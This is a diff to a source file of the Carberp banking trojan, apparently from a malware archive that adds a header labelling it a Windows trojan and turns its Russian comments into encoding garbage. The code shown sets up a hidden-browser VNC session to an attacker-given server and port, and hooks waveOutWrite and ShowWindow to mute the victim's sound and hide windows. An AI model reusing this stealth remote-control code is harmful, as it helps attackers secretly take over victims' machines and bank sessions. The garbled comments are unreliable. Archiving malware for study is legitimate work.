@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <shlobj.h>
 
@@ -70,10 +81,10 @@ bool ExecuteSBCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
 	#ifdef KeepAliveH
 		isALive("SBIsALive");
 	#endif
-	// Запуск потока скрытого браузера
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PVNC V = CreateStruct(VNC);
 
-	// Парсим аргументы
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	V->Server = STR::GetLeftStr(PArgs, ":");
 	PCHAR Port = STR::GetRightStr(PArgs, ":");
 	if(Port != NULL)
@@ -88,14 +99,14 @@ bool ExecuteSBCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
 
 }
 //----------------------------------------------------------------------------
-//хуки и все что для них надо
+//пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 typedef BOOL ( WINAPI *PShowWindow   )( HWND hWnd, int Cmd );
 typedef MMRESULT ( WINAPI *PwaveOutWrite   )( HWAVEOUT hwo, LPWAVEHDR pwh, UINT cbwh );//winmm.dll Sounds
 
 PShowWindow    Real_ShowWindow;
 PwaveOutWrite    Real_waveOutWrite;
 
-///необходимые флаги
+///пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 /*
 typedef enum {
     SHGFP_TYPE_CURRENT  = 0,   // current value for user, verify it exists
@@ -106,13 +117,13 @@ typedef enum {
 
 
 
-MMRESULT WINAPI Hook_WaveOutWrite(HWAVEOUT hwo, LPWAVEHDR pwh, UINT cbwh)//вырубаем звук
+MMRESULT WINAPI Hook_WaveOutWrite(HWAVEOUT hwo, LPWAVEHDR pwh, UINT cbwh)//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 {
 	return MMSYSERR_NOERROR;
 }
 
 
-BOOL WINAPI Hook_ShowWindow(HWND hWnd, int Cmd)//отлавливаем окна которые показывает
+BOOL WINAPI Hook_ShowWindow(HWND hWnd, int Cmd)//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 {
 	WCHAR cClasN[MAX_PATH];
 		pGetClassNameW(hWnd,cClasN,MAX_PATH);
